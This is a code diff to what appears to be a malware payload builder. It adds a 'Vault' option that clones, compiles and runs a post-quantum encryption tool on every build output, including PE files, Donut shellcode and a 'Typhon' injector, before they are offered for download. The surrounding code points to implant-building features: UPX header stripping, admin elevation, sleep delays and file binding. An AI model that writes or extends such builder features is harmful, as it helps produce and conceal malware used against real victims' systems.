@@ -89,6 +89,8 @@ type BuildProcessConfig = {
   enableDonut?: boolean;
   enableTyphon?: boolean;
   typhonVariant?: string;
+  enableVault?: boolean;
+  vaultRecipient?: string;
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
@@ -269,6 +271,98 @@ async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boo
     }
   } catch {}
   return false;
+}
+
+async function checkVaultAvailable(sendToStream: (data: any) => void): Promise<string | null> {
+  const toolsDir = path.join(ensureDataDir(), "tools");
+  const localVault = path.join(toolsDir, process.platform === "win32" ? "vault.exe" : "vault");
+
+  // 1. VAULT_BIN env var
+  const envBin = process.env.VAULT_BIN?.trim();
+  if (envBin && fs.existsSync(envBin)) {
+    sendToStream({ type: "output", text: `Vault found: ${envBin} (VAULT_BIN)\n`, level: "info" });
+    return envBin;
+  }
+
+  // 2. System PATH — vault info exits 0 when the binary is present
+  try {
+    const check = await $`vault info`.quiet().nothrow();
+    if (check.exitCode === 0) {
+      sendToStream({ type: "output", text: `Vault found in PATH\n`, level: "info" });
+      return "vault";
+    }
+  } catch {}
+
+  // 3. Previously built binary cached in data/tools/
+  if (fs.existsSync(localVault)) {
+    sendToStream({ type: "output", text: `Vault found: ${localVault}\n`, level: "info" });
+    return localVault;
+  }
+
+  // 4. Auto-build from source via Cargo (cross-platform — works wherever Rust is installed)
+  sendToStream({ type: "output", text: "Vault not found — attempting to build from source (requires Rust/cargo)...\n", level: "info" });
+  try {
+    fs.mkdirSync(toolsDir, { recursive: true });
+    const srcDir = path.join(toolsDir, "vault-pq-src");
+
+    if (!fs.existsSync(path.join(srcDir, "Cargo.toml"))) {
+      sendToStream({ type: "output", text: "Cloning messecv3/vault-pq...\n", level: "info" });
+      const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/vault-pq.git ${srcDir}`.quiet().nothrow();
+      if (cloneResult.exitCode !== 0) {
+        const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
+        sendToStream({ type: "output", text: `WARNING: Failed to clone vault-pq: ${err}\n`, level: "warn" });
+        return null;
+      }
+    }
+
+    sendToStream({ type: "output", text: "Building vault-pq (cargo build --release)...\n", level: "info" });
+    const buildResult = await $`cargo build --release`.cwd(srcDir).nothrow().quiet();
+    if (buildResult.exitCode !== 0) {
+      const err = (buildResult.stderr.toString() || buildResult.stdout.toString()).trim();
+      sendToStream({ type: "output", text: `WARNING: vault-pq build failed: ${err}\n`, level: "warn" });
+      return null;
+    }
+
+    const releaseBin = path.join(srcDir, "target", "release", process.platform === "win32" ? "vault.exe" : "vault");
+    if (!fs.existsSync(releaseBin)) {
+      sendToStream({ type: "output", text: "WARNING: vault build succeeded but binary not found\n", level: "warn" });
+      return null;
+    }
+
+    fs.copyFileSync(releaseBin, localVault);
+    if (process.platform !== "win32") fs.chmodSync(localVault, 0o755);
+    sendToStream({ type: "output", text: `Vault built and cached: ${localVault}\n`, level: "info" });
+    return localVault;
+  } catch (buildErr: any) {
+    sendToStream({ type: "output", text: `WARNING: vault-pq auto-build failed: ${buildErr.message || buildErr}\n`, level: "warn" });
+  }
+
+  return null;
+}
+
+async function ensureVaultKeypair(vaultBin: string, sendToStream: (data: any) => void): Promise<string | null> {
+  const keyPath = path.join(ensureDataDir(), "tools", "vault-operator-key");
+  const pubKeyPath = keyPath + ".pub";
+
+  if (!fs.existsSync(pubKeyPath)) {
+    sendToStream({ type: "output", text: "Generating Vault operator keypair for this server...\n", level: "info" });
+    const result = await $`${vaultBin} keygen --output ${keyPath}`.nothrow().quiet();
+    if (result.exitCode !== 0 || !fs.existsSync(pubKeyPath)) {
+      const err = (result.stderr.toString() || result.stdout.toString()).trim();
+      sendToStream({ type: "output", text: `WARNING: Failed to generate Vault keypair: ${err}\n`, level: "warn" });
+      return null;
+    }
+    sendToStream({ type: "output", text: `Vault keypair generated.\n`, level: "info" });
+    sendToStream({ type: "output", text: `  Private key: ${keyPath}\n`, level: "info" });
+    sendToStream({ type: "output", text: `  Public  key: ${pubKeyPath}\n`, level: "info" });
+    sendToStream({ type: "output", text: `IMPORTANT: Download the private key to decrypt vault files — keep it safe and off the server.\n`, level: "warn" });
+  }
+
+  try {
+    return fs.readFileSync(pubKeyPath, "utf8").trim();
+  } catch {
+    return null;
+  }
 }
 
 function stripUpxHeaders(filePath: string): boolean {
@@ -511,6 +605,19 @@ export async function startBuildProcess(
           level: "error",
         });
         throw new Error("Typhon not found");
+      }
+    }
+
+    let vaultBin: string | null = null;
+    if (config.enableVault) {
+      vaultBin = await checkVaultAvailable(sendToStream);
+      if (!vaultBin) {
+        sendToStream({
+          type: "output",
+          text: "ERROR: Vault is not available. Install Rust/cargo or place the vault binary in data/tools/, then retry. See https://github.com/messecv3/vault-pq\n",
+          level: "error",
+        });
+        throw new Error("Vault not found");
       }
     }
 
@@ -1184,6 +1291,50 @@ func runBoundFiles() {
         logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
         sendToStream({ type: "output", text: errorMsg, level: "error" });
         throw err;
+      }
+    }
+
+    // Vault post-quantum encryption — runs after all platform builds so every output
+    // (PE, shellcode, Typhon injector) is encrypted before being offered for download.
+    if (vaultBin) {
+      sendToStream({ type: "status", text: "Encrypting build outputs with Vault..." });
+      sendToStream({ type: "output", text: "\n=== Vault Post-Quantum Encryption ===\n", level: "info" });
+
+      let recipientKey = config.vaultRecipient?.trim() || null;
+      if (!recipientKey) {
+        recipientKey = await ensureVaultKeypair(vaultBin, sendToStream);
+      } else {
+        sendToStream({ type: "output", text: "Using provided Vault recipient key\n", level: "info" });
+      }
+
+      if (recipientKey) {
+        const filesToEncrypt = [...(build.files as any[])];
+        for (const file of filesToEncrypt) {
+          const inputPath = path.join(outDir, file.filename);
+          const vaultName = deps.sanitizeOutputName(file.filename + ".vault");
+          const vaultPath = path.join(outDir, vaultName);
+          try {
+            const encResult = await $`${vaultBin} encrypt -i ${inputPath} -o ${vaultPath} -r ${recipientKey}`.nothrow().quiet();
+            if (encResult.exitCode !== 0) {
+              const errText = (encResult.stderr.toString() || encResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Vault encrypt failed for ${file.filename}: ${errText}\n`, level: "warn" });
+            } else {
+              const vaultSize = Bun.file(vaultPath).size;
+              sendToStream({ type: "output", text: `Encrypted: ${file.filename} → ${vaultName} (${vaultSize} bytes)\n`, level: "info" });
+              (build.files as any[]).push({
+                name: vaultName,
+                filename: vaultName,
+                platform: file.platform,
+                version: file.version,
+                size: vaultSize,
+              });
+            }
+          } catch (vaultErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Vault failed for ${file.filename}: ${vaultErr.message || vaultErr}\n`, level: "warn" });
+          }
+        }
+      } else {
+        sendToStream({ type: "output", text: "WARNING: No Vault recipient key available — skipping encryption\n", level: "warn" });
       }
     }
 
